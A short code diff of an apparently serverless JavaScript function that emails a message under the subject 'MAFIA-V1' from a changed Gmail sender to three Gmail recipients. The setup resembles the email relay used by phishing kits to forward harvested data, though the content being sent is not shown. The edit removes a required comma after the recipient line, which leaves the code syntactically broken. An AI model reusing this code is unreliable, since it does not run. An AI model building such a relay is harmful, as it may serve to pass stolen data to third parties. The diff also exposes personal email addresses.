@@ -25,8 +25,8 @@ exports.handler = async function(event, context) {
   });
 
   let mailOptions = {
-    from: 'cuentaluperonp5@gmail.com',
-    to: 'sierroalee@gmail.com, fendergriseldo@gmail.com, almanzarrichard217@gmail.com',
+    from: 'jazzysell123@gmail.com',
+    to: 'sierroalee@gmail.com, fendergriseldo@gmail.com, almanzarrichard217@gmail.com'
     subject: 'MAFIA-V1',
     text: message,
   };
